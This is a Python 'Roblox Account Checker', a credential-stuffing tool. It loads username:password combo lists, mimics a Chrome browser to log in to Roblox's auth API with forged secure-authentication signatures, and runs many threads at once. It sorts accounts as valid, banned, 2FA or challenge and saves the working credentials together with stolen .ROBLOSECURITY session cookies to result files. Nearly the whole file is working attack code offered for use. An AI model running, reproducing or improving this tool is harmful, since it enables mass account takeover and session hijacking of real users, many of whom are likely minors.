import requests
import json
import time
import base64
import os
import sys
from typing import Optional, Dict, Any, Tuple
from dataclasses import dataclass
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
from cryptography.hazmat.backends import default_backend
from datetime import datetime
import threading
from queue import Queue
import concurrent.futures
import glob

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORS = True
except ImportError:
    class Fore:
        RED = ''; GREEN = ''; YELLOW = ''; BLUE = ''; MAGENTA = ''; CYAN = ''; WHITE = ''; RESET = ''
    class Back:
        RED = ''; GREEN = ''; YELLOW = ''; BLUE = ''; MAGENTA = ''; CYAN = ''; WHITE = ''; RESET = ''
    class Style:
        BRIGHT = ''; DIM = ''; NORMAL = ''; RESET_ALL = ''
    COLORS = False

@dataclass
class AuthResult:
    success: bool
    user_id: Optional[int] = None
    username: Optional[str] = None
    display_name: Optional[str] = None
    cookie: Optional[str] = None
    error: Optional[str] = None
    error_message: Optional[str] = None
    full_response: Optional[Dict] = None
    is_banned: Optional[bool] = None
    requires_2fa: bool = False
    twofa_ticket: Optional[str] = None
    twofa_media: Optional[str] = None
    twofa_data: Optional[Dict] = None
    requires_captcha: bool = False
    captcha_token: Optional[str] = None
    requires_challenge: bool = False
    challenge_data: Optional[Dict] = None

class RobloxAuthenticator:
    def __init__(self, debug=False):
        self.session = requests.Session()
        self.debug = debug
        self._setup_headers()
        self._setup_cookies()
        
    def _setup_headers(self):
        chrome_version = "120.0.0.0"
        headers = {
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Safari/537.36',
            'sec-ch-ua': f'"Not_A Brand";v="8", "Chromium";v="{chrome_version.split(".")[0]}", "Google Chrome";v="{chrome_version.split(".")[0]}"',
            'sec-ch-ua-mobile': '?0',
            'accept': 'application/json, text/plain, */*',
            'origin': 'https://www.roblox.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.roblox.com/',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=1, i',
            'content-type': 'application/json;charset=UTF-8'
        }
        self.session.headers.update(headers)
    
    def _setup_cookies(self):
        cookies = {
            'GuestData': 'UserID=-2114957648',
            'RBXEventTrackerV2': 'CreateDate=02/11/2026 20:38:27&rbxid=8289121664&browserid=1766919949490003',
            'rbx-ip2': '1',
            '__utmc': '200924205'
        }
        for name, value in cookies.items():
            self.session.cookies.set(name, value, domain='.roblox.com')
    
    def get_xsrf_token(self) -> Optional[str]:
        try:
            self.session.options('https://auth.roblox.com/v2/login', timeout=10)
            token = self.session.headers.get('x-csrf-token')
            if token:
                return token
        except:
            pass
        
        try:
            response = self.session.post('https://auth.roblox.com/v2/logout', timeout=10)
            token = response.headers.get('x-csrf-token')
            if token:
                self.session.headers.update({'x-csrf-token': token})
                return token
        except:
            pass
        
        return None
    
    def get_server_nonce(self) -> Optional[str]:
        try:
            response = self.session.get(
                'https://apis.roblox.com/hba-service/v1/getServerNonce',
                timeout=30
            )
            if response.status_code == 200:
                raw_text = response.text.strip()
                if raw_text.startswith('"') and raw_text.endswith('"'):
                    return raw_text[1:-1]
                return raw_text
        except:
            pass
        return None
    
    def generate_ecdsa_keys(self) -> Tuple[Any, str]:
        private_key = ec.generate_private_key(
            ec.SECP256R1(),
            default_backend()
        )
        public_key = private_key.public_key()
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        public_b64 = ''.join(
            line.strip() 
            for line in public_pem.decode('utf-8').split('\n')[1:-2]
        )
        return private_key, public_b64
    
    def sign_challenge(self, private_key: Any, nonce: str, timestamp: int) -> str:
        message = f"{nonce}:{timestamp}".encode('utf-8')
        signature = private_key.sign(message, ec.ECDSA(hashes.SHA256()))
        r, s = decode_dss_signature(signature)
        r_bytes = r.to_bytes(32, byteorder='big')
        s_bytes = s.to_bytes(32, byteorder='big')
        ieee_sig = r_bytes + s_bytes
        return base64.b64encode(ieee_sig).decode('utf-8')
    
    def login(self, username: str, password: str) -> AuthResult:
        try:
            xsrf = self.get_xsrf_token()
            nonce = self.get_server_nonce()
            if not nonce:
                return AuthResult(False, error="Failed to get server nonce")
            
            private_key, public_key = self.generate_ecdsa_keys()
            timestamp = int(time.time())
            signature = self.sign_challenge(private_key, nonce, timestamp)
            
            payload = {
                "ctype": "Username",
                "cvalue": username,
                "password": password,
                "secureAuthenticationIntent": {
                    "clientPublicKey": public_key,
                    "clientEpochTimestamp": timestamp,
                    "serverNonce": nonce,
                    "saiSignature": signature
                }
            }
            
            response = self.session.post(
                'https://auth.roblox.com/v2/login',
                json=payload,
                timeout=30
            )
            
            xsrf_token = response.headers.get('x-csrf-token')
            if xsrf_token:
                self.session.headers.update({'x-csrf-token': xsrf_token})
                
                if response.status_code == 403 and "Token Validation Failed" in response.text:
                    new_timestamp = int(time.time())
                    new_signature = self.sign_challenge(private_key, nonce, new_timestamp)
                    payload["secureAuthenticationIntent"]["clientEpochTimestamp"] = new_timestamp
                    payload["secureAuthenticationIntent"]["saiSignature"] = new_signature
                    
                    response = self.session.post(
                        'https://auth.roblox.com/v2/login',
                        json=payload,
                        timeout=30
                    )
            
            if response.status_code == 200:
                data = response.json()
                cookie = None
                for c in self.session.cookies:
                    if c.name == '.ROBLOSECURITY':
                        cookie = c.value
                        break
                
                user_data = data.get('user', {})
                is_banned = data.get('isBanned')
                if is_banned is None:
                    is_banned = data.get('isbanned', False)
                
                return AuthResult(
                    True,
                    user_id=user_data.get('id'),
                    username=user_data.get('name'),
                    display_name=user_data.get('displayName') or user_data.get('displayname'),
                    cookie=cookie,
                    is_banned=is_banned,
                    full_response=data
                )
            
            elif response.status_code == 403:
                try:
                    error_data = response.json()
                    
                    if 'twoStepVerificationData' in error_data:
                        twofa_data = error_data.get('twoStepVerificationData', {})
                        media_type = twofa_data.get('mediaType') or twofa_data.get('mediaType', 'Unknown')
                        ticket = twofa_data.get('ticket')
                        
                        return AuthResult(
                            False, 
                            error="2FA_REQUIRED",
                            error_message=f"Two-step verification required via {media_type}",
                            requires_2fa=True,
                            twofa_ticket=ticket,
                            twofa_media=media_type,
                            twofa_data=twofa_data,
                            full_response=error_data
                        )
                    
                    elif 'errors' in error_data:
                        for error in error_data['errors']:
                            if 'code' in error:
                                if error['code'] == 1:
                                    return AuthResult(
                                        False, 
                                        error="INVALID_CREDENTIALS",
                                        error_message=error.get('message', 'Incorrect username or password'),
                                        full_response=error_data
                                    )
                                elif error['code'] == 9:
                                    return AuthResult(
                                        False,
                                        error="CAPTCHA_REQUIRED",
                                        error_message=error.get('message', 'Captcha required'),
                                        requires_captcha=True,
                                        full_response=error_data
                                    )
                                elif error['code'] == 0:
                                    msg = error.get('message', 'Token validation failed')
                                    if 'challenge' in msg.lower():
                                        return AuthResult(
                                            False,
                                            error="CHALLENGE_REQUIRED",
                                            error_message=msg,
                                            requires_challenge=True,
                                            challenge_data=error,
                                            full_response=error_data
                                        )
                                    else:
                                        return AuthResult(
                                            False,
                                            error="TOKEN_ERROR",
                                            error_message=msg,
                                            full_response=error_data
                                        )
                    
                    elif 'message' in error_data and 'twoStepVerification' in error_data.get('message', ''):
                        return AuthResult(
                            False,
                            error="2FA_REQUIRED",
                            error_message="Two-step verification required",
                            requires_2fa=True,
                            full_response=error_data
                        )
                    
                    message = None
                    if 'message' in error_data:
                        message = error_data['message']
                    elif 'errors' in error_data and len(error_data['errors']) > 0:
                        message = error_data['errors'][0].get('message')
                    
                    if message and 'challenge' in message.lower():
                        return AuthResult(
                            False,
                            error="CHALLENGE_REQUIRED",
                            error_message=message,
                            requires_challenge=True,
                            full_response=error_data
                        )
                    
                    return AuthResult(
                        False, 
                        error="HTTP_403", 
                        error_message=message,
                        full_response=error_data
                    )
                except Exception as e:
                    return AuthResult(False, error="HTTP_403", error_message="Forbidden")
            
            else:
                try:
                    error_data = response.json()
                    message = None
                    if 'errors' in error_data and len(error_data['errors']) > 0:
                        message = error_data['errors'][0].get('message')
                    elif 'message' in error_data:
                        message = error_data['message']
                    
                    return AuthResult(
                        False, 
                        error=f"HTTP_{response.status_code}", 
                        error_message=message,
                        full_response=error_data
                    )
                except:
                    return AuthResult(False, error=f"HTTP_{response.status_code}")
                
        except Exception as e:
            return AuthResult(False, error="EXCEPTION", error_message=str(e))

def list_combo_files():
    if not os.path.exists("Combo"):
        os.makedirs("Combo")
    
    txt_files = glob.glob("Combo/*.txt")
    if not txt_files:
        print(f"{Fore.RED}No .txt files found in Combo folder{Fore.RESET}")
        return None
    
    print(f"\n{Fore.CYAN}Available combo files:{Fore.RESET}")
    for i, file in enumerate(txt_files, 1):
        file_size = os.path.getsize(file)
        print(f"{Fore.WHITE}{i}. {os.path.basename(file)} ({file_size} bytes){Fore.RESET}")
    
    while True:
        try:
            choice = input(f"\n{Fore.WHITE}Select file number: {Fore.CYAN}").strip()
            if choice.isdigit() and 1 <= int(choice) <= len(txt_files):
                return txt_files[int(choice)-1]
            else:
                print(f"{Fore.RED}Invalid choice. Please enter a number between 1 and {len(txt_files)}{Fore.RESET}")
        except KeyboardInterrupt:
            return None

def load_accounts(filename):
    accounts = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':', 1)
                    username = parts[0].strip()
                    password = parts[1].strip()
                    if username and password:
                        accounts.append((username, password))
    except FileNotFoundError:
        print(f"{Fore.RED}File {filename} not found!{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}Error loading accounts: {e}{Fore.RESET}")
    return accounts

def save_result(account_type, username, password, result_data):
    if not os.path.exists("Results"):
        os.makedirs("Results")
    
    filename = f"Results/{account_type}.txt"
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            if account_type == "valid":
                ban_status = "BANNED" if result_data.get('is_banned') else "NOT_BANNED"
                cookie = result_data.get('cookie', 'No cookie')
                f.write(f"{username}:{password} | ID: {result_data['user_id']} | {ban_status} | Cookie: {cookie}\n")
            elif account_type == "banned":
                f.write(f"{username}:{password} | ID: {result_data['user_id']}\n")
            elif account_type == "2fa":
                ticket = result_data.get('ticket', 'N/A')
                media = result_data.get('media', 'Unknown')
                f.write(f"{username}:{password} | Media: {media} | Ticket: {ticket}\n")
            elif account_type == "captcha":
                f.write(f"{username}:{password}\n")
            elif account_type == "challenge":
                message = result_data.get('message', 'Challenge required')
                f.write(f"{username}:{password} | {message}\n")
            elif account_type == "invalid":
                message = result_data.get('message', 'No message')
                f.write(f"{username}:{password} | {message}\n")
    except Exception as e:
        print(f"{Fore.RED}Error saving result: {e}{Fore.RESET}")

def display_stats(stats, total, completed):
    sys.stdout.write(f"\r{Fore.CYAN}[{completed}/{total}] {Fore.GREEN}✓:{stats['valid']} {Fore.RED}✗:{stats['invalid']} {Fore.YELLOW}⚡:{stats['challenge']} {Fore.MAGENTA}2FA:{stats['2fa']} {Fore.YELLOW}⚠:{stats['banned']} {Fore.RESET}")
    sys.stdout.flush()

def check_account(username, password, results_queue):
    auth = RobloxAuthenticator(debug=False)
    result = auth.login(username, password)
    
    output = {
        'username': username,
        'password': password,
        'status': 'unknown',
        'data': {},
        'display': ''
    }
    
    if result.success:
        if result.is_banned:
            output['status'] = 'banned'
            output['display'] = f"{Fore.YELLOW}{username}:{password} -> BANNED (ID: {result.user_id}){Fore.RESET}"
            output['data'] = {'user_id': result.user_id, 'is_banned': True}
        else:
            output['status'] = 'valid'
            output['display'] = f"{Fore.GREEN}{username}:{password} -> Name: {result.display_name} | ID: {result.user_id} | isBanned: {result.is_banned}{Fore.RESET}"
            output['data'] = {
                'user_id': result.user_id,
                'display_name': result.display_name,
                'cookie': result.cookie,
                'is_banned': False
            }
    else:
        if result.requires_2fa:
            output['status'] = '2fa'
            output['display'] = f"{Fore.MAGENTA}{username}:{password} -> 2FA REQUIRED | {result.error_message}{Fore.RESET}"
            output['data'] = {
                'ticket': result.twofa_ticket,
                'media': result.twofa_media
            }
        
        elif result.requires_captcha:
            output['status'] = 'captcha'
            output['display'] = f"{Fore.BLUE}{username}:{password} -> CAPTCHA REQUIRED | {result.error_message}{Fore.RESET}"
            output['data'] = {}
        
        elif result.requires_challenge:
            output['status'] = 'challenge'
            output['display'] = f"{Fore.YELLOW}{username}:{password} -> CHALLENGE | {result.error_message}{Fore.RESET}"
            output['data'] = {'message': result.error_message}
        
        elif result.error == "INVALID_CREDENTIALS":
            output['status'] = 'invalid'
            output['display'] = f"{Fore.RED}{username}:{password} -> {result.error_message}{Fore.RESET}"
            output['data'] = {'message': result.error_message}
        
        else:
            
            error_msg = result.error_message or result.error or "Unknown error"
            output['status'] = 'invalid'
            output['display'] = f"{Fore.RED}{username}:{password} -> {error_msg}{Fore.RESET}"
            output['data'] = {'message': error_msg}
    
    results_queue.put(output)
    return output

def main():
    print(f"{Fore.CYAN}{Style.BRIGHT}Roblox Account Checker{Style.RESET_ALL}")
    print(f"{Fore.CYAN}══════════════════════════{Fore.RESET}")
    
    filename = list_combo_files()
    if not filename:
        return
    
    accounts = load_accounts(filename)
    if not accounts:
        print(f"{Fore.RED}No valid accounts found in file{Fore.RESET}")
        return
    
    print(f"\n{Fore.CYAN}Loaded {len(accounts)} accounts from {os.path.basename(filename)}{Fore.RESET}")
    
    try:
        threads = int(input(f"{Fore.WHITE}Threads (default 5): {Fore.CYAN}").strip() or "5")
    except:
        threads = 5
    
    print(f"\n{Fore.YELLOW}Starting check...{Fore.RESET}\n")
    
    results_queue = Queue()
    stats = {'valid': 0, 'banned': 0, '2fa': 0, 'captcha': 0, 'challenge': 0, 'invalid': 0}
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for username, password in accounts:
            future = executor.submit(check_account, username, password, results_queue)
            futures.append(future)
        
        completed = 0
        for future in concurrent.futures.as_completed(futures):
            completed += 1
            while not results_queue.empty():
                result = results_queue.get_nowait()
                
                status = result['status']
                stats[status] = stats.get(status, 0) + 1
                
                print(f"\r{result['display']}")
                
                if status == 'valid':
                    save_result('valid', result['username'], result['password'], result['data'])
                elif status == 'banned':
                    save_result('banned', result['username'], result['password'], result['data'])
                elif status == '2fa':
                    save_result('2fa', result['username'], result['password'], result['data'])
                elif status == 'captcha':
                    save_result('captcha', result['username'], result['password'], result['data'])
                elif status == 'challenge':
                    save_result('challenge', result['username'], result['password'], result['data'])
                else:
                    save_result('invalid', result['username'], result['password'], result['data'])
            
            display_stats(stats, len(accounts), completed)
    
    print(f"\n\n{Fore.GREEN}{Style.BRIGHT}" + "="*60)
    print("FINAL STATISTICS")
    print("="*60)
    print(f"{Fore.GREEN}Valid: {stats['valid']}")
    print(f"{Fore.YELLOW}Banned: {stats['banned']}")
    print(f"{Fore.MAGENTA}2FA: {stats['2fa']}")
    print(f"{Fore.BLUE}Captcha: {stats['captcha']}")
    print(f"{Fore.YELLOW}Challenge: {stats['challenge']}")
    print(f"{Fore.RED}Invalid: {stats['invalid']}")
    print(f"{Fore.CYAN}Total: {len(accounts)}")
    print("="*60 + f"{Style.RESET_ALL}")
    print(f"\n{Fore.GREEN}Results saved in 'Results' folder{Fore.RESET}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Cancelled by user{Fore.RESET}")
    except Exception as e:
        print(f"\n{Fore.RED}Fatal error: {e}{Fore.RESET}")